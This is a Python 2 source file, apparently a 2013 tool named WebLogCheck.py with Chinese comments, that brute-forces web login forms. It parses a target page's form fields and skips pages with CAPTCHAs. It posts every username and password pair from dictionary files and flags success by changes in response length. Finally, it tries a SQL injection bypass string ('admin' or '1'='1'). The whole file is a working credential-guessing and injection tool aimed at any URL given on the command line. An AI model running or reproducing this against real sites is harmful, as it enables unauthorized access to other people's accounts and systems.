#coding=utf-8
#WebLogCheck.py v1.0.3
#2013-5-8,code by zf_w11
#v1.0.1:修复缺少</form>导致无法获取action的bug
#v1.0.2:改进错误提示和程序稳定性
#v1.0.3:改进socke超时设置
#v1.0.3:引入html log 文件，通过修改该文件解决解析html错误时无法获取actions的问题
#v1.0.3:修正了检测验证码的逻辑错误

import HTMLParser,os,sys
import urllib
import urllib2
import urlparse
import optparse
import time
import socket

timeout=3	#timeout时间可在这里修改

#定义一个函数，用于在指定文本中搜索是否存在指定的字符串
def search_str(text,slist,encode=""):
#说明：为了支持中午搜索，需要先将str转换为unicode
#在函数中按照unicode进行各种字符串的处理
#但是在返回或者写入的时候需要重新转换为str:str.encode('utf-8')
	if encode != "":	#encode=""说明不转换为unicode
		try:
			text=text.decode(encode)
		except:
			try:
				text=text.decode("utf-8")
			except:
				print "Cann't convert %s to unicode" % encode
				return False
	#
	for check in slist:
		if text.strip().lower().find(check) != -1:
			return True
	return False

class MyHTMLParser(HTMLParser.HTMLParser):
	#dlist=[]
	def __init__(self):
		HTMLParser.HTMLParser.__init__(self)
		#self.action['username']
		#self.action['password']
		#self.action['args']=[]
		#self.action['action']
		self.action={}
		self.action['args']=[]
		self.action['password']={}
		self.action['username']={}
		self.action['action']=""
		#一个页面可能有多个表单
		self.actions=[]

		#判断是否是登录页面应该在调用函数中
		#self.islogin=False
		#判断登录页面是否存在验证码
		self.validcode=False
		#取得页面的title
		self.title=""
		self.hastitle=False
		#判断页面的编码类型，默认为gb2312
		self.content="gb2312"
		#验证码的特征字串
		self.checkcode=[u"验证码",u"validcode",u"validatecode",u"verifycode"]
		#验证input name用户名的特征字段
		self.checkuser=["username","uname","user","uid","usr","user_name","u_name","account","name","email","LoginName"]

		#标记</form>
		self.endform=False

	

	def handle_starttag(self,tag,attrs):
		if tag == 'meta':
			for name,value in attrs:
				if name == 'content' and value.find("charset=") != -1:
					self.content=value[8+value.find("charset="):]
		if tag == 'form':
			for name,value in attrs:
				#print name+": "+value+"\t"
				if name == 'action':
					self.action['action']=value		#可能是相对路径文件名，也可能是绝对路径，为空时就是访问页面本身!
					#print "action:"+value
			
		if tag == 'input':
			inputname=""
			inputvalue=""
			ispasswd=False
			isuname=False
			for name,value in attrs:
				#检查密码框
				if name == 'name':
					inputname=value
				if name == 'value':
					inputvalue=value
				if name == 'type' and value.lower() == 'password':
					ispasswd=True
			#check is passwd text?
			if ispasswd :
				self.action['password']={inputname:"@@pass@@"}	#(inputname,inputvalue)
				#print self.action['password']

			#check is username text?
			elif search_str(inputname,self.checkuser) ==True:
				self.action['username']={inputname:"@@user@@"}

			#将其他参数统一送入action['args']中
			else:
				#有些input是为了选择框radio、checkbox等的，暂不处理这些input，这些input的inputname=""
				if inputname != "":
					self.action['args'].append({inputname:inputvalue})

		if tag == 'title':
			self.hastitle=True

	def handle_data(self,data):
		#check title
		if self.hastitle == True:
			self.title=data.strip()
			try:
				print "Title: "+self.title.decode("utf-8").encode("gb2312")
			except:
				print "Title: "+self.title
			self.hastitle=False

		#check validcode
		#注意，有些登录页面在data内容中没有验证码等字符，因此在使用actions之前，除了先判断validcode是否为True之外，还要判断action中的name中是否有特征字符
		if search_str(data,self.checkcode,self.content) == True:
			self.validcode=True
			print "****Has Validcode!******"
			return	#此处可直接返回

	def handle_endtag(self,tag):
		#print tag
		if tag == 'form' or (tag == 'body' and not self.endform and self.action['password'] != {}):
			#一个form表单结束
			#此处要修复一个bug：页面有<form action=""....>但没有以</form>结束。通过</body>判断，这种情况只记录最后一个form
			self.actions.append(self.action)
			#重新初始化action
			self.action={}
			self.action['args']=[]
			self.action['password']={}
			self.action['username']={}
			self.action['action']=""
			self.endform=True
		



def getaction_url(url,action):
	#url:访问页面的url地址，fetch.geturl()
	#action:在action="action"中的内容，可能是相对的，也可能是绝对的
	#返回：action的绝对地址
	if url == "":
		print "parseraction:arg url is null"
		return ""
	elif url.strip().find("http") == -1:
		print "url参数应该是绝对url地址，比如http://或者https://".decode("utf-8").encode("gb2312")
		return ""
	else:
		if action == "":
			#说明处理action的页面就是url页面本身
			return url
		elif action.strip().find("http") != -1:
			return action
		else:
			return urlparse.urljoin(url,action)


def fetchaction(url,html):
	#html: a html page
	my=MyHTMLParser()
	my.feed(html)
	actions=my.actions
	#actions_str=[(act_str,arg_str)]
	#注意，username是以%40%40user%40%40进行占位的，password是以%40%40pass%40%40占位的
	actions_str=[]


	#print url
	for myaction in actions:
		#只处理找到username,password并且没有验证码的actions
		#add url to action referer
		
		arg_str={}
		act_str=""
		#print myaction
		if my.validcode:
			print "This form has validcode..."
			exit(0)
		elif not myaction['password']:
			print "This form may be not about user login..."
		elif myaction['password'] and myaction['username']:# and not my.validcode :
			act_str=getaction_url(url,myaction['action'])
			arg_str.update(myaction['username'])
			arg_str.update(myaction['password'])

			for arg in myaction['args']:
				arg_str.update(arg)
			#print "\n"
			actions_str.append((act_str,urllib.urlencode(arg_str)))
		
		else:
			print "Cann't confirm input name for the user in this login form...You can add the user inputname to self.checkuser string list to enable this checklogin"
	#print actions_str
	return actions_str


def postdata(action,ulist=["test"],plist=["test"]):
	#根据单个action(act_str,arg_str)发送post请求
	#记得应将username,password占位符号进行替换
	#首先使用一个绝对不正确的用户名密码登录，获得登录不成功的响应html，用于跟字典中的进行比较
	header={"User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1"}
	print "Action: "+action[0]+"?"+action[1]

	args=action[1].replace("%40%40user%40%40","myuser0765432d1")	#pass不进行置换了
	args=args.replace("%40%40pass%40%40","mypass0765432d1")
	#print args
	#add cookie
	cookies = urllib2.HTTPCookieProcessor()
	opener = urllib2.build_opener(cookies)
	f = opener.open(action[0])
	#
	req=urllib2.Request(action[0],args)
	req.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1")
	req.add_header("Referer",action[0])
	req.add_header("Accept-Encoding","gzip,deflate,sdch")
	#failrsp=urllib2.urlopen(req)
	failrsp=opener.open(req)

	fail=failrsp.read()
	#输出一个绝对错误响应
	#print fail
	flen=len(fail.replace("myuser0765432d1",""))
	
	print "Check user: myuser0765432d1	pass: mypass0765432d1	Res length: %s" % str(flen)
	failrsp.close()

	time.sleep(timeout)

	for u in ulist:
		u=u.strip('\n')
		
		for p in plist:
			try:
				p=p.strip('\n')
				args=action[1].replace("%40%40user%40%40",u)
				#说明：密码字典中%username%表示用户名
				args=args.replace("%40%40pass%40%40",p.replace("%username%",u))
				#print args
				req=urllib2.Request(action[0],args)
				req.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1")
				req.add_header("Referer",action[0])
				req.add_header("Accept-Encoding","gzip,deflate,sdch")
				#rsp=urllib2.urlopen(req)
				rsp=opener.open(req)
				#rsphtml=rsp.read().decode("utf-8").encode("gb2312")
				rsphtml=rsp.read()
				le=len(rsphtml.replace(u,""))
				print "Check user: %s \tpass: %s \tRes length: %s" % (u,p.replace("%username%",u),str(le))
				#print rsphtml
				if abs(flen-le) > 128:
					print "\n\nuser: %s\tpass: %s\tFound!\n\n" % (u,p.replace("%username%",u))
					#print rsphtml
					rsp.close()
					return
				rsp.close()
				time.sleep(timeout)
			except Exception as e:
				print "Check user: %s \tpass: %s \t%s" % (u,p.replace("%username%",u),e)
				
	#最后check一下万能密码
	args=action[1].replace("%40%40user%40%40","admin' or '1'='1")
	args=args.replace("%40%40pass%40%40","' or '1'='1")
	
	req=urllib2.Request(action[0],args)
	req.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1")
	req.add_header("Referer",action[0])
	req.add_header("Accept-Encoding","gzip,deflate,sdch")
	#failrsp=urllib2.urlopen(req)
	failrsp=opener.open(req)

	fail=failrsp.read()
	le=len(fail.replace("admin' or '1'='1",""))
	
	print "Check user: admin' or '1'='1	pass: ' or '1'='1	Res length: %s" % str(le)
	if abs(flen-le) >128:
		print "user: admin' or '1'='1 \tpass: ' or '1'='1 \t Found!"
	failrsp.close()
	

def checklogin(logurl,fuser="user.txt",fpass="pass.txt"):
	#try:
	#首先将字典内容读到list中

	ulist=[]
	plist=[]
	try:
		f=open(fuser,"r")
		ulist=f.readlines()
		f.close()
		f=open(fpass,"r")
		plist=f.readlines()
		f.close()
	except Exception as e:
		#print "Cann't open file %s or %s,quit now..." % (fuser,fpass)
		print e
		exit(0)
	
	#注意：此时ulist,plist每个元素都以'\n'结束，考虑到会在后面的使用中for，应该把去除工作放到使用它们的函数
	
	fetch=urllib.urlopen(logurl)
	loghtml=fetch.read()

	#print fetch.info()			取得响应的head信息
	#print fetch.getcode()		取得响应的状态码
	if 200 != fetch.getcode():
		print "Response not 200,quit now..."
		exit(0)

	#将html文件写入当前目录，文件名为WebLogCheck.html
	f=open('WebLogCheck.html','w')
	f.write(loghtml)
	f.close()

	#此处询问是否通过修改html log文件继续提取action
	result=raw_input("Do you want to change the html log file 'WebLogCheck.html' and fetch the actions?(Y/N)\nNotice:you should first change the log file and then put your input\n")
	#请先修改html文件，然后输入Y
	if result.lower() == 'y':
		f=open('WebLogCheck.html','r')
		loghtml=f.read()
		f.close()

	actions=[]

	try:
		actions=fetchaction(fetch.geturl(),loghtml)
	except Exception as e:
		#print 'Errors occur when fetching actions,some like "HTMLParser.HTMLParseError: malformed start tag",quit now...'
		print e
		exit(0)

	if not actions:
		print "None actions in this html.\nHtml responsed may be not standard,change the html log file and continue.."
		exit(0)
	for a in actions:
		postdata(a,ulist,plist)
	fetch.close()

	
def main():
	parser=optparse.OptionParser('Usages: WebLogCheck.py -t http://target.com/login.htm -u user.txt -p pass.txt')
	parser.add_option('-t','--target',dest='urlpath',action='store',help='url of the target,start with "http://" or "https://"')
	parser.add_option('-u','--user',dest='fuser',action='store',help='username dic file',default='user.txt')
	parser.add_option('-p','--pass',dest='fpass',action='store',help='password dic file',default='pass.txt')
	(options,args) = parser.parse_args()

	if options.urlpath == None:
		print parser.usage
		exit(0)

	socket.setdefaulttimeout(20)
	checklogin(options.urlpath,options.fuser,options.fpass)

if __name__ == '__main__':
	main()
